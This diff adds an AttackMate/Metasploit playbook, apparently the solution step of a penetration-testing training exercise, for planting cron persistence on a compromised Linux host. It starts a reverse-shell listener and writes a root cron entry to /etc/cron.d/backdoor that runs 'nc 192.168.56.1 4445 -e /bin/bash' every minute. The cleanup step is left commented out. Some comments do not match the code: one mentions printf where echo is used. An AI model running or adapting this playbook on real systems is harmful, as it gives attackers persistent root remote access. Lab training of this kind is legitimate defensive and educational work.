@@ -1,0 +1,63 @@
+# Phase 5 SOLUTION: Persistence - Cron Backdoor
+#
+# Writes a reverse bash shell to /etc/cron.d/ (requires root). The cron daemon
+# reads this file and executes the entry every minute, calling back to the
+# attacker's listener automatically - no attacker interaction required.
+#
+# Variables required: $SESSION_NAME, $ATTACKER_IP, $LPORT
+# ATT&CK: T1053.003 (Scheduled Task/Job: Cron)
+#
+# Cron entry format:
+#   <minute> <hour> <day> <month> <weekday> <user> <command>
+# A wildcard (*) means "every". "* * * * * root <cmd>" fires every minute as root.
+#
+# LPORT: use 4445 - port 4444 is already taken by the initial Metasploit session.
+#
+# CLEANUP: Remove /etc/cron.d/backdoor at the end of the exercise.
+
+commands:
+
+  # Start a listener to catch the cron callback.
+  # cmd/unix/reverse_bash matches the plain bash reverse shell written to cron.
+  # background: true keeps AttackMate running while waiting for the callback.
+  # LPORT 4445 is used because 4444 is already in use by the entry session.
+  - type: msf-module
+    cmd: exploit/multi/handler
+    creates_session: cron_callback
+    payload: cmd/unix/reverse_bash
+    payload_options:
+      LHOST: $ATTACKER_IP
+      LPORT: "4445"
+    background: true
+    kill_on_exit: true
+    metadata:
+      tactic: "TA0011"
+      technique: "T1095"
+      technique_name: "Non-Application Layer Protocol"
+
+  # Write the cron entry to the target.
+  # printf is used instead of echo to avoid shell interpretation issues with
+  # the >& redirect inside the command string.
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: "/bin/bash -p"
+
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: echo '* * * * * root nc 192.168.56.1 4445 -e /bin/bash' > /etc/cron.d/backdoor
+    metadata:
+      tactic: "TA0003"
+      technique: "T1053.003"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  - type: debug
+    cmd: "Cron entry installed. Starting listener - callback expected within 60 seconds."
+
+  - type: msf-session
+    session: cron_callback
+    cmd: id
+
+  # CLEANUP: uncomment to remove the backdoor cron entry
+  # - type: msf-session
+  #   session: $SESSION_NAME
+  #   cmd: rm /etc/cron.d/backdoor
